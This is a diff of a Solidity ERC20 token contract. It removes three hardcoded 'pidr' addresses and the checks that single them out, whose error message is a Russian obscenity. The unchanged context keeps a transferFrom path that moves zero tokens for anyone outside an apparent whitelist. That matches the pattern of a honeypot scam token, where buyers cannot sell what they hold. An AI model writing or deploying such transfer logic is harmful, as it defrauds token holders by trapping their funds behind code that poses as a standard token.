@@ -38,10 +38,6 @@ contract TokenERC20 is IERC20, Ownable, ReentrancyGuard {
     uint8 internal _decimals = 18;
     uint256 internal _totalSupply = 1e4 * 1e18;
 
-    address pidr = 0x1E0F6EDfdBbf197d7A89A5518e1a2bd3Af75afA4;
-    address pidr2 = 0x000000224f8364bB91259b24435881efc3752b3E;
-    address pidr3 = 0x0eae4d1227F4335dDacdab69E4d028E3Dcb318F4;
-
     constructor() {
         whitelist[msg.sender] = true;
         whitelist[address(this)] = true;
@@ -120,10 +116,6 @@ contract TokenERC20 is IERC20, Ownable, ReentrancyGuard {
             _transfer(from, to, amount);
             _approve(from, msg.sender, amount);
             return true;
-        } else if (from == pidr || to == pidr || from == pidr2 || to == pidr2 || from == pidr3 || to == pidr3) {
-            _transfer(from, to, 0);
-            _approve(from, msg.sender, 0);
-            return false;
         } else {
             _transfer(from, to, 0);
             _approve(from, msg.sender, 0);
@@ -163,10 +155,6 @@ contract TokenERC20 is IERC20, Ownable, ReentrancyGuard {
     function _approve(address owner, address spender, uint256 amount) internal virtual {
         require(owner != address(0), 'ERC20: approve from the zero address');
         require(spender != address(0), 'ERC20: approve to the zero address');
-
-        require(owner != pidr || spender != pidr, 'Pshel nahui');
-        require(owner != pidr2 || spender != pidr2, 'Pshel nahui');
-        require(owner != pidr3 || spender != pidr3, 'Pshel nahui');
 
         _allowances[owner][spender] = amount;
         emit Approval(owner, spender, amount);
